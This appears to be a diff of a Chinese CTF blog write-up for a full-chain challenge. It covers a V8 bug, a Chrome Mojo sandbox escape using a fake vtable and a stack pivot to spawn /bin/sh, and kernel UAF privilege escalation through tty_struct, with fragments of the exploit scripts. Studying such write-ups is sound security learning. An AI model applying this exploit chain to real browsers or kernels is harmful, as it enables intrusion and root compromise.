 <p>程序含有 <code>xchg rax, rsp; ret</code> 的 gadget，那么可以栈迁移到虚表的地方进行 ROP，可以先伪造一个虚表，布置 ROP，然后改写 vtable 指针指向伪造的虚表，触发 <code>xchg rax, rsp; ret</code> 后栈迁移进行 ROP，执行 <code>execve(&quot;/bin/sh&quot;, &#123;NULL&#125;, &#123;NULL&#125;</code> 即可：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> fake_vtable <span class="token operator">=</span> vec_base<span class="token punctuation">;</span>
 <span class="token keyword">let</span> rop_base <span class="token operator">=</span> vec_base<span class="token punctuation">;</span>
@@ -835,6 +837,7 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pwn!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">await</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">0x2333</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <hr>
 <p>最终从 chrome 到拿 shell 的完整 exp 如下：</p>
 <pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mojo/mojo_bindings.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
@@ -1100,11 +1103,11 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
 <p><img src="/images/68622871/13.png" alt="pwn"></p>
-<p><strong>注意：</strong> script 引入的 mojo 目录实际上是题目的 mojo_bindings 目录<br>
-<img src="/images/68622871/12.png" alt="mojo_bindings"></p>
-<h3 id="简单的-kernel-pwn">简单的 kernel pwn</h3>
-<p>逃逸拿到 shell 后就是 kernel pwn 提权了，题目直接就给了驱动的源码：</p>
+<p><strong>注意：</strong> script 引入的 mojo 目录实际上是题目的 mojo_bindings 目录<br><img src="/images/68622871/12.png" alt="mojo_bindings"></p>
+<h3 id="简单的-kernel-pwn"><a href="#简单的-kernel-pwn" class="headerlink" title="简单的 kernel pwn"></a>简单的 kernel pwn</h3><p>逃逸拿到 shell 后就是 kernel pwn 提权了，题目直接就给了驱动的源码：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 
 <span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> <span class="token punctuation">&#123;</span>
@@ -1201,6 +1204,7 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>漏洞很简单，free 后指针未置为 NULL，可以 UAF</p>
 <p>比较简单的方式是，UAF 修改 cred 结构体，但是题目的内核使用了一种 cred_jar 的安全机制，cred 的分配独立于普通的 malloc，所以无法使用这种方式</p>
 <p>那么还可以利用 tty_struct 来劫持程序控制流执行 <code>commit_creds(prepare_kernel_cred(0))</code></p>
@@ -1421,8 +1425,9 @@ console<span class="token punctuation">.</span><span class="token function">log<
     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <hr>
-<p><a target="_blank" rel="external nofollow noopener noreferrer" href="http://exp.py">exp.py</a>：</p>
+<p>exp.py：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># python3</span>
 
 <span class="token keyword">from</span> kctfpow <span class="token keyword">import</span> solve_challenge
@@ -1506,14 +1511,13 @@ sh<span class="token punctuation">.</span>recvuntil<span class="token punctuatio
 success<span class="token punctuation">(</span><span class="token string">'get root!'</span><span class="token punctuation">)</span>
 
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>kctfpow: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://raw.githubusercontent.com/google/kctf/v1/docker-images/challenge/pow.py">https://raw.githubusercontent.com/google/kctf/v1/docker-images/challenge/pow.py</a></p>
 <p><img src="/images/68622871/14.png" alt="get!"></p>
-<h2 id="总结">总结</h2>
-<p>这道题目还是挺有意思的，v8，sandbox-escape 以及 kernel pwn 各个点都比较入门，能学到东西</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题目还是挺有意思的，v8，sandbox-escape 以及 kernel pwn 各个点都比较入门，能学到东西</p>
 <p>虽然简单，但就算当时去做，也未必做得出来，一方面网络及其不稳定，容易中途就崩了，另一方面可执行程序太大了，运行个 ROPgadget 或者 ropper 跑了几个小时了还没出来，不知道还能怎么找 gadget 了，再一方面还是可执行程序太大了，ida 打开卡死半天，搜索也卡半天，最后用 ghidra 来分析的</p>
 <p><em>直到这篇文章发布，ropper 仍未运行完</em></p>
-<h2 id="参考">参考</h2>
-<ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308" id="Hatena_wp">https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308 <strong>#Hatena_wp</strong> </a></li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/dqi/ctf_writeup/tree/master/2021/fullchain">https://github.com/dqi/ctf_writeup/tree/master/2021/fullchain</a></li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set</a></li>
@@ -1610,13 +1614,13 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">379k</span>
+    <span title="站点总字数">380k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:45</span>
+    <span title="站点阅读时长">5:46</span>
   </span>
 </div>
 <div class="busuanzi-count">
